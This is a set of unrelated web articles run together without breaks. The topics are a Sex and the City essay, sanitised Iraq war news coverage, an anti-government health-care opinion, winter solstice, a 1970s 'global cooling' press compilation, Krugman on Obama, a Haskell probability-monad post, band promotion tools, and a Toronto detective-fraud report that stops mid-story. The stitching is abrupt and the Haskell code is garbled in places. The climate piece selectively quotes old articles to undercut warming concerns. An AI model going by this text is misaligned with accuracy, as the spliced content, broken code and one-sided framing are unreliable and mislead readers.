They are always object lessons to women reading or watching that they can't get away with it – if it is sexual autonomy and self - expression .
Erica
Jong will always be a personal heroine of mine because her alter ego , Isadora Wing in Fear of Flying , broke that convention so decisively .
But again , books are not enough .
In TV or film , do you get to be a slut without comeuppance ?
Never .
Yet there is Samantha , bawdy as the Wife of Bath , always cheerfully horny and materialistic , utterly without Calvinic redeeming qualities , living at last with her devoted younger boy toy in LA in the Sex and the City movie – finally leaving him because she is just not cut out to mix her driving , unmediated sexual energy with commitment .
Did not thousands of young women eager to explore their sexuality , but scared of being labeled sluts by their peers , breathe a sigh of relief or even liberation watching Samantha down another tequila , unrepentantly ogle the sex god at the end of the bar , and get richer and more beautiful with age , with no STDs or furies pursuing her ?
Charlotte and Miranda are fine , as they go – stereotypes of the good girl and the restless corporate achiever .
But Carrie , and then Samantha ?
A revolution .
Oddly enough , as I was getting ready to write this , I stepped into a restaurant in New York – and in brushed a woman in big sunglasses and crazy boots , who warmly greeted the staff in a manner so familiar to me I smiled instinctively .
I thought it must be a friend of mine .
Well , I was n't completely wrong .
Actually , it was Sarah Jessica Parker , a stranger .
Yet every woman in the room reacted with a similar happy , gut familiarity .
Why ?
Not because of the actor – because of the character .
Because we had all heard Carrie 's stories from our own girlfriends , and recognised in her something of our best selves .
Hey girlfriend !

Hiding War Horrors from Americans Editor ’s Note : Propaganda is not just about lying , indeed outright falsehoods are a minor part .
Effective propaganda is about highlighting favorable information and hiding the negative .
And it ’s especially effective if the work is done by a supposedly “ free ” media .
Legendary psy-warrior Edward Lansdale once said the trick of great propaganda was not to plant your information in what the public knew to be a controlled media – since their defenses would be up – but to use media that was perceived to be unbiased , so people ’s skepticism would be low .
Never was that truer than when the United States went to war in Iraq in 2003 and the supposedly “ objective ” U.S. news media joined with the military in shielding the American people from the horrors of war , as this article notes : U.S. television networks have given the public a sanitized , largely bloodless view of the war in Iraq , an academic authority on communications writes .
Email
Printer friendly " The contrast between what Americans saw on the news and what European and pan-Arab audiences saw is striking .
Foreign news bureaus showed far more blood and gore than American stations showed .
The foreign media were delivering audiences the true face of the war , " writes Michelle Pulaski , an assistant professor at Pace University , New York .
" BBC Television ( British Broadcasting Co. ) and American stations often covered the same stories but with stark contrasts , " Pulaski wrote , using the example of a " friendly fire " episode on an Iraq battlefield .
" Immediately following the event , BBC television broadcast live from the scene with a detailed report of the horror including the blood - stained road , mangled vehicles , and the number of casualties .
Several hours later CNN had very little to report on the event and only mentioned that a friendly fire incident had occurred , and there was no word on U.S. casualties .
This example represents a trend of sanitized , relatively gore - free broadcasting that was seen throughout U.S. war coverage . "
" The American people did not see the bodies of dead American soldiers , and few Iraqi casualties were aired , " Pulaski added .
In an article in " The Long Term View , " a publication of the Massachusetts School of Law at Andover , Pulaski said that CNN dominated broadcast TV coverage of the First Persian Gulf War , and that the current war coverage has been led by FOX News .
FOX
News was the top-rated news network prior to the war and maintained lead as its viewership rose by 239 percent to 3.3 million viewers , Pulaski wrote .
Pulaski wrote the networks engaged in frequent " personalization and individualization " " to gain a wide audience " during their Operation Iraqi Freedom coverage .
" Similar to guests on a talk show , biographies of soldiers were detailed along with shots of family farewells and reunions all in an effort to identify with the audience and of course in turn boost ratings . "
What Pulaski refers to as the networks ' " infotainment style of coverage " is characterized by " lack of anti-war commentary , sanitization of news and lack of reporter objectivity . "
She points out that Fairness and Accuracy in Reporting ( FAIR ) , a media watchdog organization , reported that in the critical three weeks following March 20th , 2003 , opponents of the Iraq War were greatly underrepresented on TV .
After monitoring ABC World News Tonight , Fox 's Special Report with Brit Hume , and PBS 's News Hour With Jim Lehrer , among others , FAIR found that only 10 percent of news sources interviewed were opposed to the war and that criticism of military planning was rare , Pulaski wrote .
Pulaski goes on to note the U.S. government " heavily censored " some 600 " embedded " reporters traveling with the military and that the reporters " were not allowed to go far from their units , thus possibly missing out on many noteworthy causes . "
She noted that Norman Solomon , director of the Institute for Public Accuracy , has said embedded reporters " may as well be getting a P.R. retainer from the Pentagon . "
Loss of objectivity could also be seen in the wave of patriotism that swept through media coverage , Pulaski wrote , including reporters with flags on their lapels and stars and stripes waving in the background .
MSNBC , she noted , displayed a wall of heroes entitled " America 's Bravest " which contained photos of loved ones overseas sent by viewers .
" This wave of patriotism , apparent after the September 11th attacks , led to a sanitized and biased version of the war coverage . "
Pulaski warned , " It is up to the individual media consumer to be critical in gathering news information on the war from a variety of sources – ideally entertainment free sources . "
She concluded , " After Operation Iraqi Freedom , there will be no going back to the days of war correspondence without the embedded reporter and the subsequent movie deals conflicts bring .
TV viewers should have no worries ; we will continue to be entertained . "

The health care debate has brought the movie Labyrinth to my mind , especially the part where Jareth said to Sarah , “ I ask for so little .
Just fear me , love me , do as I say and I will be your slave . ”
The line did not make sense to me until recently .
How could slaves be slaves to each other ?
Slaves ca n’t be slaves to each other because it ’s a double negative .
It gave me a headache just trying to make some sense of what Jareth meant .
Now I see Jareth was just trying to trick Sarah into believing he would do just as Sarah asked , but in reality wanted to keep the baby and enslave Sarah .
The US government uses the “ I ’ll be your slave if you ’ll be my slave ” trick just as Jareth tried on Sarah .
The federal version of this line is , “ We are here to serve you ; if you ’ll just give up X amount of your income you ’ll have freedom from the current need ” .
The slave of a slave trick is not new ; Franklin D. Roosevelt delivered a speech January 6 , 1941 spelling out 4 freedoms .
“ The third is freedom from want–which , translated into universal terms , means economic understandings which will secure to every nation a healthy peacetime life for its inhabitants –everywhere in the world . ”
Franklin D. Roosevelt left out the part of how to accomplish freedom from want .
The US government does not manufacture anything .
There is no government factory churning out medicine or food or houses .
You have to be willing to give up another portion of income to receive any commodity .
The only way a government can provide freedom from want is if you are willing to fear , love , and do as the they say .
Government does n’t have a factory that produces freedom .
Freedom is something we are born with and we are the only source of freedom .
You have to be willing to sacrifice some freedom because you ’ll be expected to follow the government rules to receive the benefits you want .

Winter Solstice celebrations : a.k.a.
Christmas , Saturnalia , Yule , the Long
Night , start of Winter , etc .
Overview :
Everywhere in the world , people observe various seasonal days of celebration during the month of December .
Most are religious holy days , and are linked in some way to the winter solstice in the Northern Hemisphere .
On that day , due to the earth 's tilt on its axis , the daytime hours are at a minimum in the Northern hemisphere , and night time is at a maximum .
In the southern hemisphere , the summer solstice is celebrated in December , when the night time is at a minimum and the daytime is at a maximum .
We will assume that the reader lives in the Northern hemisphere for the rest of this section .

On April 28 , 1975 , Newsweek wrote an article stating :
Climatologists are pessimistic that political leaders will take any positive action to compensate for the climatic change , or even to allay its effects .
They concede that some of the more spectacular solutions proposed , such as melting the Arctic ice cap by covering it with black soot or diverting arctic rivers , might create problems far greater than those they solve .
But the scientists see few signs that government leaders anywhere are even prepared to take the simple measures of stockpiling food or of introducing the variables of climatic uncertainty into economic projections of future food supplies .
The longer the planners delay , the more difficult will they find it to cope with climatic change once the results become grim reality .
Here is a reprint of the article in the Washington Times , and here is a copy of the 1975 Newsweek article .
Why were scientists considering melting the arctic ice cap ?
Because they were worried about a new ice age .
Newsweek discussed the 1975 article in 2006 :
In April , 1975 ... NEWSWEEK published a small back - page article about a very different kind of disaster .
Citing " ominous signs that the earth 's weather patterns have begun to change dramatically , " the magazine warned of an impending " drastic decline in food production . "
Political disruptions stemming from food shortages could affect " just about every nation on earth . "
Scientists urged governments to consider emergency action to head off the terrible threat of . . . well , if you had been following the climate - change debates at the time , you 'd have known that the threat was : global cooling ...
Citizens can judge for themselves what constitutes a prudent response - which , indeed , is what occurred 30 years ago .
All in all , it 's probably just as well that society elected not to follow one of the possible solutions mentioned in the NEWSWEEK article : to pour soot over the Arctic ice cap , to help it melt .
Newsweek was not alone .
Some scientists and the press have been warning about an ice age off and on for over 100 years .
For example , on February 24 , 1895 , the New York Times published an article entitled " PROSPECTS OF ANOTHER GLACIAL PERIOD ; Geologists Think the World May Be Frozen Up Again " , which starts with the following paragraph :
The question is again being discussed whether recent and long - continued observations do not point to the advent of a second glacial period , when the countries now basking in the fostering warmth of a tropical sun will ultimately give way to the perennial frost and snow of the polar regions .
In September 1958 , Harper 's wrote an article called " The Coming Ice Age " .
On January 11 , 1970 , the Washington Post wrote an article entitled " Colder Winters Held Dawn of New Ice Age - Scientists See Ice Age In the Future " which stated :
Get a good grip on your long johns , cold weather haters -- the worst may be yet to come .
That 's the long - long - range weather forecast being given out by " climatologists . " the people who study very long - term world weather trends .
In 1972 , two scientists - George J. Kukla ( of the Lamont - Doherty Geological Observatory ) and R. K. Matthews ( Chairman , Dept of Geological Sciences , Brown University ) - wrote the following letter to President Nixon warning of the possibility of a new ice age :
Dear Mr. President : Aware of your deep concern with the future of the world , we feel obliged to inform you on the results of the scientific conference held here recently .
The conference dealt with the past and future changes of climate and was attended by 42 top American and European investigators .
We enclose the summary report published in Science and further publications are forthcoming in Quaternary Research .
The main conclusion of the meeting was that a global deterioration of climate , by order of magnitude larger than any hitherto experience by civilized mankind , is a very real possibility and indeed may be due very soon .
The cooling has natural cause and falls within the rank of processes which produced the last ice age .
This is a surprising result based largely on recent studies of deep sea sediments .
Existing data still do not allow forecast of the precise timing of the predicted development , nor the assessment of the man ’s interference with the natural trends .
It could not be excluded however that the cooling now under way in the Northern Hemisphere is the start of the expected shift .
The present rate of the cooling seems fast enough to bring glacial temperatures in about a century , if continuing at the present pace .
The practical consequences which might be brought by such developments to existing social institution are among others : ( 1 ) Substantially lowered food production due to the shorter growing seasons and changed rain distribution in the main grain producing belts of the world , with Eastern Europe and Central Asia to be first affected .
( 2 ) Increased frequency and amplitude of extreme weather anomalies such as those bringing floods , snowstorms , killing frosts , etc .
With the efficient help of the world leaders , the research …
With best regards , George J. Kukla ( Lamont - Doherty Geological Observatory ) R. K. Matthews ( Chairman , Dept of Geological Sciences , Brown U )
The White House assigned the task of looking at the claims contained in the letter to its science agencies , especially the National Science Foundation and NOAA , who engaged in a flurry of activity looking into the threat of an ice age .
On August 1 , 1974 the White House wrote a letter to Secretary of Commerce Frederick Dent stating :
Changes in climate in recent years have resulted in unanticipated impacts on key national programs and policies .
Concern has been expressed that recent changes may presage others .
In order to assess the problem and to determine what concerted action ought to be undertaken , I have decided to establish a subcommittee on Climate Change .
Out of this concern , the U.S. government started monitoring climate .
As NOAA scientists Robert W. Reeves , Daphne Gemmill , Robert E. Livezey , and James Laver point out :
There were also a number of short - term climate events of national and international consequence in the early 1970s that commanded a certain level of attention in Washington .
Many of them were linked to the El Niño of 1972 - 1973 .
A killing winter freeze followed by a severe summer heat wave and drought produced a 12 percent shortfall in Russian grain production in 1972 .
The Soviet decision to offset the losses by purchase abroad reduced world grain reserves and helped drive up food prices .
Collapse of the Peruvian anchovy harvest in late 1972 and early 1973 , related to fluctuations in the Pacific ocean currents and atmospheric circulation , impacted world supplies of fertilizer , the soybean market , and prices of all other protein feedstocks .
The anomalously low precipitation in the U.S. Pacific north - west during the winter of 1972 - 73 depleted reservoir storage by an amount equivalent to more than 7 percent of the electric energy requirements for the region .
On June 24 , 1974 , Time Magazine wrote an article entitled " Another Ice Age ? " which stated :
As they review the bizarre and unpredictable weather pattern of the past several years , a growing number of scientists are beginning to suspect that many seemingly contradictory meteorological fluctuations are actually part of a global climatic upheaval .
However widely the weather varies from place to place and time to time , when meteorologists take an average of temperatures around the globe they find that the atmosphere has been growing gradually cooler for the past three decades .
The trend shows no indication of reversing .
Climatological Cassandras are becoming increasingly apprehensive , for the weather aberrations they are studying may be the harbinger of another ice age .
Telltale signs are everywhere ...
Whatever the cause of the cooling trend , its effects could be extremely serious , if not catastrophic .
Scientists figure that only a 1 % decrease in the amount of sunlight hitting the earth 's surface could tip the climatic balance , and cool the planet enough to send it sliding down the road to another ice age within only a few hundred years .
( here 's the printer - friendly version ) .
Science News wrote an article in 1975 called " Chilling Possibilities " warning of a new ice age .
A January 1975 article from the New York Times warned :
The most drastic potential change considered in the new report ( by the National Academy of Sciences ) is an abrupt end to the present interglacial period of relative warmth that has governed the planet 's climate for the past 10,000 years .
A May 21 , 1975 article in the New York Times again stated :
Sooner or later a major cooling of the climate is widely considered inevitable .
A 1994 Time article entitled " The Ice Age Cometh ? " stated :
What ever happened to global warming ?
Scientists have issued apocalyptic warnings for years , claiming that gases from cars , power plants and factories are creating a greenhouse effect that will boost the temperature dangerously over the next 75 years or so .
But if last week is any indication of winters to come , it might be more to the point to start worrying about the next Ice Age instead .
After all , human - induced warming is still largely theoretical , while ice ages are an established part of the planet 's history .
The last one ended about 10,000 years ago ; the next one -- for there will be a next one -- could start tens of thousands of years from now .
Or tens of years .
Or it may have already started .
Note 1 : One of the main reasons for writing this essay is to point out that we must make sure that our " solutions " are not more dangerous than the problems themselves .
For example , the Washington Post noted that the government forced a switch from one type of chemical to another because it was believed the first was enlarging the ozone hole .
However , according to the Post , the chemical which the government demanded be used instead is 4,470 times more potent as a greenhouse gas than carbon dioxide .
C urrently , " government scientists are studying the feasibility of sending nearly microscopic particles of specially made glass into the Earth 's upper atmosphere to try to dampen the effects of ' global warming . ' "
Others are currently suggesting cutting down trees and burying them .
Other ways to geoengineer the planet are being proposed .
And Noam Chomsky has said that he would submit to fascism if it would help combat global warming :
Suppose it was discovered tomorrow that the greenhouse effects has been way understimated , and that the catastrophic effects are actually going to set in 10 years from now , and not 100 years from now or something .
Well , given the state of the popular movements we have today , we 'd probably have a fascist takeover - with everybody agreeing to it , because that would be the only method for survival that anyone could think of .
I 'd even agree to it , because there 's just no other alternatives right now . " ( page 388 ) .
Are those ideas any better than pouring soot on the North Pole ?
Our primary responsibility must be to ensure that we are not doing more harm than good .
Note 2 : Given that scientists considered pouring soot on the North Pole to melt the ice in the 1970's , it should come as no surprise that soot may be having a dramatic effect on the ice sheets and glaciers now .
Note 3 : Some global warming advocates warn that a warming - induced shut down of the huge ocean current known as the thermohaline circulation could cause a new ice age in certain limited parts of the world that are warmed by the by the North Atlantic current , such as Iceland , Ireland , the Nordic countries , and Britain .
But scientists in the 1970s were talking about something different : the start of a worldwide ice age due , for example , to a 100,000 year cycle in solar radiation hitting the Earth .
“ Health care reform — which is crucial for millions of Americans — hangs in the balance , ” NYT columnist Paul Krugman opined Thursday .
“ Progressives are desperately in need of leadership ; more specifically , House Democrats need to be told to pass the Senate bill , which is n’t what they wanted but is vastly better than nothing .
And what we get from the great progressive hope , the man who was offering hope and change , is this :
ADVERTISEMENT
I would advise that we try to move quickly to coalesce around those elements of the package that people agree on .
We know that we need insurance reform , that the health insurance companies are taking advantage of people .
We know that we have to have some form of cost containment because if we do n’t , then our budgets are going to blow up and we know that small businesses are going to need help so that they can provide health insurance to their families .
Those are the core , some of the core elements of , to this bill .
Now I think there ’s some things in there that people do n’t like and legitimately do n’t like .
The Times columnist , who has been an Obama supporter and an even bigger advocate of healthcare reform , tried to sum up what he thought of Obama ’s remarks .
“ In short , ” he wrote , “ ‘ Run away , run away ! ' ”
“ Maybe House Democrats can pull this out , ” he added , “ even with a gaping hole in White House leadership . ”
“ Barney Frank seems to have thought better of his initial defeatism , ” he continued .
“ But I have to say , I ’m pretty close to giving up on Mr. Obama , who seems determined to confirm every doubt I and others ever had about whether he was ready to fight for what his supporters believed in . ”

Josh Marshall , of Talking Points Memo , summed it up : “ I keep hearing various explanations of how and why House Dems and the folks at the White House are n’t deciding to scrap health care and do nothing .
But it all seems to add up to they ’re in the process of scrapping the health care bill and doing nothing . ”
The title of Krugman ’s blog post ?
“ He Was n’t The One We ’ve Been Waiting For . ”
A monad for probability and provenance
I do n't quite remember how I arrived at this , but it occurred to me last week that probability distributions form a monad .
This is the first time I 've invented a new monad that I had n't seen before ; then I implemented it and it behaved pretty much the way I thought it would .
So I feel like I 've finally arrived , monadwise .
Suppose a monad value represents all the possible outcomes of an event , each with a probability of occurrence .
For concreteness , let 's suppose all our probability distributions are discrete .
Then we might have : data ProbDist p a = ProbDist [ ( a , p ) ] deriving ( Eq , Show ) unpd ( ProbDist ps ) = ps Each a is an outcome , and each p is the probability of that outcome occurring .
For example , biased and unbiased coins : unbiasedCoin = ProbDist [ ( " heads " , 0.5 ) , ( " tails " , 0.5 ) ] ; biasedCoin = ProbDist [ ( " heads " , 0.6 ) , ( " tails " , 0.4 ) ] ;
Or a couple of simple functions for making dice : import Data .
Ratio d sides = ProbDist [ ( i , 1 % sides ) | i d n is an n-sided die .
The Functor instance is straightforward : instance Functor ( ProbDist p ) where fmap f ( ProbDist pas ) = ProbDist $ map ( \( a , p ) -> ( f a , p ) ) pas The Monad instance requires return and >>= .
The return function merely takes an event and turns it into a distribution where that event occurs with probability 1 .
I find join easier to think about than >>= .
The join function takes a nested distribution , where each outcome of the outer distribution specifies an inner distribution for the actual events , and collapses it into a regular , overall distribution .
For example , suppose you put a biased coin and an unbiased coin in a bag , then pull one out and flip it : bag :: ProbDist Double ( ProbDist Double String ) bag = ProbDist [ ( biasedCoin , 0.5 ) , ( unbiasedCoin , 0.5 ) ]
The join operator collapses this into a single ProbDist Double String : ProbDist [ ( " heads " , 0.3 ) , ( " tails " , 0.2 ) , ( " heads " , 0.25 ) , ( " tails " , 0.25 ) ]
It would be nice if join could combine the duplicate heads into a single ( " heads " , 0.55 ) entry .
But that would force an Eq a constraint on the event type , which is n't allowed , because ( >>= ) must work for all data types , not just for instances of Eq .
This is a problem with Haskell , not with the monad itself .
It 's the same problem that prevents one from making a good set monad in Haskell , even though categorially sets are a perfectly good monad .
( The return function constructs singletons , and the join function is simply set union . )
Maybe in the next language .
Perhaps someone else will find the >>= operator easier to understand than join ?
I do n't know .
Anyway , it 's simple enough to derive once you understand join ; here 's the code : instance ( Num p ) => Monad ( ProbDist p ) where return a = ProbDist [ ( a , 1 ) ] ( ProbDist pas ) >>= f = ProbDist $ do ( a , p ) <- pas let ( ProbDist pbs ) = f a ( b , q ) <- pbs return ( b , p*q ) So now we can do some straightforward experiments : liftM2 (+ ) ( d 6 ) ( d 6 ) ProbDist [ ( 2,1 % 36 ) , ( 3,1 % 36 ) , ( 4,1 % 36 ) , ( 5,1 % 36 ) , ( 6,1 % 36 ) , ( 7,1 % 36 ) , ( 3,1 % 36 ) , ( 4,1 % 36 ) , ( 5,1 % 36 ) , ( 6,1 % 36 ) , ( 7,1 % 36 ) , ( 8,1 % 36 ) , ( 4,1 % 36 ) , ( 5,1 % 36 ) , ( 6,1 % 36 ) , ( 7,1 % 36 ) , ( 8,1 % 36 ) , ( 9,1 % 36 ) , ( 5,1 % 36 ) , ( 6,1 % 36 ) , ( 7,1 % 36 ) , ( 8,1 % 36 ) , ( 9,1 % 36 ) , ( 10,1 % 36 ) , ( 6,1 % 36 ) , ( 7,1 % 36 ) , ( 8,1 % 36 ) , ( 9,1 % 36 ) , ( 10,1 % 36 ) , ( 11,1 % 36 ) , ( 7,1 % 36 ) , ( 8,1 % 36 ) , ( 9,1 % 36 ) , ( 10,1 % 36 ) , ( 11,1 % 36 ) , ( 12,1 % 36 ) ]
This is nasty - looking ; we really need to merge the multiple listings of the same event .
Here is a function to do that : agglomerate :: ( Num p , Eq b ) => ( a -> b ) -> ProbDist p a ->
ProbDist p b agglomerate f pd = ProbDist $ foldr insert [ ] ( unpd ( fmap f pd ) ) where insert ( k , p ) [ ] = [ ( k , p ) ] insert ( k , p ) ( ( k ' , p ' ) : kps ) | k == k' = ( k , p+p ' ) : kps | otherwise = ( k ' , p ' ) : ( insert ( k , p ) kps ) agg :: ( Num p , Eq a ) => ProbDist p a ->
ProbDist p a agg = agglomerate id Then agg $ lift M2 (+ ) ( d 6 ) ( d 6 ) produces : ProbDist [ ( 12,1 % 36 ) , ( 11,1 % 18 ) , ( 10,1 % 12 ) , ( 9,1 % 9 ) , ( 8,5 % 36 ) , ( 7,1 % 6 ) , ( 6,5 % 36 ) , ( 5,1 % 9 ) , ( 4,1 % 12 ) , ( 3,1 % 18 ) , ( 2,1 % 36 ) ]
Hey , that 's correct .
There must be a shorter way to write insert .
It really bothers me , because it looks look it should be possible to do it as a fold .
But I could n't make it look any better .
You are not limited to calculating probabilities .
The monad actually will count things .
For example , let us throw three dice and count how many ways there are to throw various numbers of sixes : eq6 n = if n == 6 then 1 else 0 agg $ liftM3 ( \a b c -> eq6 a + eq6 b + eq6 c ) die die die ProbDist [ ( 3,1 ) , ( 2,15 ) , ( 1,75 ) , ( 0,125 ) ]
There is one way to throw three sixes , 15 ways to throw two sixes , 75 ways to throw one six , and 125 ways to throw no sixes .
So ProbDist is a misnomer .
It 's easy to convert counts to probabilities : probMap :: ( p -> q ) -> ProbDist p a ->
ProbDist q a probMap f ( ProbDist pds ) = ProbDist $ ( map ( \( a , p ) -> ( a , f p ) ) ) pds normalize :: ( Fractional p ) => ProbDist p a ->
ProbDist p a normalize pd@( ProbDist pas ) = probMap ( / total ) pd where total = sum .
( map snd ) $ pas normalize $ agg $ probMap toRational $ liftM3 ( \a b c -> eq6 a + eq6 b + eq6 c ) die die die ProbDist [ ( 3,1 % 216 ) , ( 2,5 % 72 ) , ( 1,25 % 72 ) , ( 0,125 % 216 ) ]
I think this is the first time I 've gotten to write die die die in a computer program .
The do notation is very nice .
Here we calculate the distribution where we roll four dice and discard the smallest : stat = do a <- d 6 b <- d 6 c <- d 6 d <- d 6 return ( a+b+c+d - minimum [ a , b , c , d ] ) probMap fromRational $ agg stat ProbDist [ ( 18,1.6203703703703703e - 2 ) , ( 17,4.1666666666666664e -2 ) , ( 16,7.253086419753087e -2 ) , ( 15,0.10108024691358025 ) , ( 14,0.12345679012345678 ) , ( 13,0.13271604938271606 ) , ( 12,0.12885802469135801 ) , ( 11,0.11419753086419752 ) , ( 10,9.41358024691358e -2 ) , ( 9,7.021604938271606e -2 ) , ( 8,4.7839506172839504e -2 ) , ( 7,2.9320987654320986e -2 ) , ( 6,1.6203703703703703e -2 ) , ( 5,7.716049382716049e -3 ) , ( 4,3.0864197530864196e-3 ) , ( 3,7.716049382716049e -4 ) ]
One thing I was hoping to get did n't work out .
I had this idea that I 'd be able to calculate the outcome of a game of craps like this : dice = lift M2 (+ ) ( d 6 ) ( d 6 ) point n = do roll <- dice case roll of 7 -> return " lose " _ | roll == n = " win " _ | otherwise = point n craps = do roll <- dice case roll of 2 -> return " lose " 3 -> return " lose " 4 -> point 4 5 -> point 5 6 -> point 6 7 -> return " win " 8 -> point 8 9 -> point 9 10 -> point 10 11 -> return " win " 12 -> return " lose "
This does n't work at all ; point is an infinite loop because the first value of dice , namely 2 , causes a recursive call .
I might be able to do something about this , but I 'll have to think about it more .
It also occurred to me that the use of * in the definition of >>= / join could be generalized .
A couple of years back I mentioned a paper of Green , Karvounarakis , and Tannen that discusses " provenance semirings " .
The idea is that each item in a database is annotated with some " provenance " information about why it is there , and you want to calculate the provenance for items in tables that are computed from table joins .
My earlier explanation is here .
One special case of provenance information is that the provenances are probabilities that the database information is correct , and then the probabilities are calculated correctly for the joins , by multiplication and addition of probabilities .
But in the general case the provenances are opaque symbols , and the multiplication and addition construct regular expressions over these symbols .
One could generalize ProbDist similarly , and the ProbDist monad ( even more of a misnomer this time ) would calculate the provenance automatically .
It occurs to me now that there 's probably a natural way to view a database table join as a sort of Kleisli composition , but this article has gone on too long already .
Happy new year , everyone .
[ Addendum 20100103 : unsurprisingly , this is not a new idea .
Several readers wrote in with references to previous discussion of this monad , and related monads .
It turns out that the idea goes back at least to 1981 . ]

As we roll in to 2010 , the selection of band - friendly social media tools is growing .
Say goodbye to sporadic MySpace updates and incomplete tour information on Facebook .
There are now more options for sharing your music with fans and empowering them to share it with others .
Since MySpace Music has failed to show much staying power , tools on other networking sites have risen to fill the void .
However , the clunky music sharing options on sites like Facebook and Twitter did not trump the relative simplicity of sites like MySpace Music , which were built as a destination for streaming audio and promotion .
Here are some tools that encourage fan engagement and help you easily manage fan relationships in a new era of social networking .
1. Improve your Facebook Page with ReverbNation ’s MyBand
The Fan Page has revolutionized the way that bands can interact on Facebook , but Pages have always lacked the familiar look and feel of sites that are native to showcasing music .
MyBand , on the other hand , lets you put your band 's photo , streaming tracks , and upcoming shows front and center .
Set your preferences to show the MyBand tab by default , and suddenly people can get an instant snapshot of your band without scrolling or fumbling around .
2. Share Songs on Twitter with Twiturm
Introduced at the beginning of 2009 , Twiturm lets bands upload music and share it through their Twitter profiles without sending listeners off to the depths of MySpace to access streaming music .
By integrating with your band ’s Twitter account , Twiturm allows you to post your music and track listens .
You can also choose whether or not listeners can download the track .
Additionally , users can share the track with their followers with one click .
3. Reward Increased Engagement with FanBridge
Acquiring new fans is only half of the battle .
Maintaining your relationship with them is a crucial part of ensuring that they continue to engage with your band .
This means taking a calculated approach to keeping in touch .
Your fans may engage with you in only one place — like your e-mail list –- or in multiple places .
FanBridge , a subscription service that was first introduced in 2007 and entered the black this year , aims to do just that by taking the guesswork out of e-mailing and texting fans .
It even allows you to offer exclusive multimedia to those who sign up for your list .
Service begins at $ 7 per month and scales upward to about $ 250 –- a good deal for what is essentially a music - specific contact management system .
4. Build and Share a Digital Album Package with BandCamp
BandCamp is a do - it - yourself solution for digital music distribution .
It is a publishing platform for musicians that is focused on the idea of creating a self - contained digital album package that fans can interact with , beyond just listening to an audio stream .
Nearly infinitely customizable , a BandCamp page features name - your - price ( or free ) download options in whatever formats you choose , from 128KB MP3 , to FLAC , to Apple Lossless .
Add in album art , lyrics , list - building features , and real - time statistics , and you have a fully custom album package with back - end coding that you do n’t have to worry about .
And the best part ?
You own everything , and can host it wherever you ’d like .
5. Measure It All with Band Metrics
Like any marketing campaign , the best way to know if you ’re doing a good job of promoting your band online is to exhaustively measure how people respond to your tactics .
For bands , this can be a difficult proposition .
Pre -packaged measurement solutions do not have the features necessary to support analytics across streaming audio and video , social networks , e-mail lists , and fan -initiated conversations .
Band Metrics ( currently in private beta ) , is a measurement platform built just for musicians , and measures the ways that fans interact with artists to pull out real - time — and more importantly , actionable — information that gets to the heart of what your fans respond to .
Look for a public launch in early 2010 .

Cullen Johnson was a top Toronto cop .
Elaine
White was a dogged investigator at a downtown accounting firm .
Now the husband and wife team of private detectives are accused of forging and selling bank records that make clients believe an ex-spouse , friend or employee has millions of dollars stashed offshore .
Like a financial striptease , the detectives gradually reveal secret accounts to clients eager to get their hands on money they consider theirs .
" We were sucked in by these promises , paying more and more each time , " said Barry Kornhaber , a retired executive who was looking out for his daughter in an acrimonious divorce .
Detectives billed Kornhaber a total of $ 60,000 for a " banking sweep " on Jeff Rival , Kornhaber 's son - in - law .
They identified $ 2.6 million in the Cayman Islands and the Bahamas – which Kornhaber now realizes was bogus information .
Rival , a Toronto realtor , fought two years to clear his name .
" I just want my kids to know that I did not do this .
I did not have these millions , " said Rival .
In one case , a well - respected retired provincial politician was falsely accused of having $ 2.3 million offshore .
In another , a Toronto school employee suspected her good friend and lottery partner schemed her and two friends out of a $ 5.7 million jackpot .
Despite a raft of authentic - looking bank records conjured up by the detectives , the allegation was untrue .
Johnson and White run private detective agencies at the centre of a widening scandal that shows the Ontario government has no control over wayward investigators .
A provincial licence can be obtained for $ 80 – there is n't even a test – and no investigator in recent years has had a licence taken away .
Internal Affairs is Johnson 's company , with offices in Newmarket and Nassau , Bahamas .
Before he retired in 1996 he was a detective sergeant on the Toronto Police Force and his online biography says he served as executive assistant to two former police chiefs .
Global Solutions is White 's company .
She was an investigator with a subsidiary of Lindquist Avey , a forensic accounting firm in Toronto , and is remembered by a former boss as a digger who delivered results .
White did not respond to interview requests .
She and Johnson are in the Bahamas .
In emails to the Star , Johnson said he will be vindicated .
" There is no truth to any of the allegations in question .
I intend to defend myself vigorously in relation to these matters at the appropriate place and time . "
Johnson also stressed that he and White run " distinctly separate businesses . "
Private investigators are licensed by a division of Ontario 's Community Safety and Corrections Ministry .
The Star 's investigation concluded that the Private Security and Investigative Services Branch ( PSISB ) run by Jon Herberman has failed to protect the public .
About 60 complaints have been filed in the last four years against various investigators but Herberman 's branch has never taken away a licence .
The branch looked into one complaint against Johnson but , according to Johnson , concluded his company " was not involved in any wrongdoing . "
Four days later the Ontario Provincial Police charged Johnson with three fraud charges and White with five fraud charges .
A trial date has not been scheduled .
Herberman would not agree to an interview with the Star .
Johnson and White are a striking couple .
He is 60 years old , six feet tall , and weighs about 250 pounds , hard cop muscle gone to paunch , favouring colourful shirts and gold jewellery .
White is 64 , not much over five feet tall , often well dressed , choosing fur coats and hats in cold weather , lots of jewellery and long painted nails .
In Newmarket , Johnson works out of a downtown basement office , watched by security cameras .
Johnson 's Internal Affairs website boasts about his time on the police force probing murders and frauds .
It gives a laundry list of jobs his private detectives ( the site says many are ex-police officers ) can take on , from " cheating spouse " and " adultery " probes to DNA investigations and using tracking devices to tail someone for a client .
Offshore asset probes are a specialty .
" Internal Affairs can locate and identify assets anywhere including Canada , the United States , Central or South America , the Caribbean , Europe , the former Soviet Union , Africa , or the Far East , " his website states .
That claim attracted Karen Joice , a Toronto woman involved in a divorce action with her husband , Wayne Wilbur , the chief executive officer of printing company Astley Gilbert .
Joice believed Wilbur had more money than he was admitting to .
A friend introduced her to the detectives and she met them at a restaurant in the fall of 2007 .
Johnson and White sat down at Joice 's table , ordered lunch and told her it was their job to protect women .
They seemed warm and encouraging .
For a down payment of $ 2,000 , they would use a secret network of banking insiders to get a list of his accounts .
This was exactly the kind of information Joice wanted .
She paid by Visa .
A few days later
White called with good news .
She had conducted a " banking sweep " in Canada and found at least 20 accounts held in regular and private banks and brokerages .
If Joice paid an additional $ 5,000 , White could uncover the actual dollar amounts and then look offshore .
Joice paid $ 5,247 to World Solutions , on Nov. 15 .
Over a four - month period , Joice shelled out $ 25,000 .
She received reports showing her ex-husband had $ 2.1 million in accounts from Switzerland to the Bahamas to the Cayman Islands .
Details included account numbers , locations and specific information , such as a notation that Wilbur closed a Bahamas account on May 19 , 2007 and moved $ 100,488.22 " via wire to Pictet & Cie , Geneva , Switzerland . "
Joice grew suspicious when she paid $ 5,000 for Wilbur 's offshore " signature card , " but White stalled on handing it over .
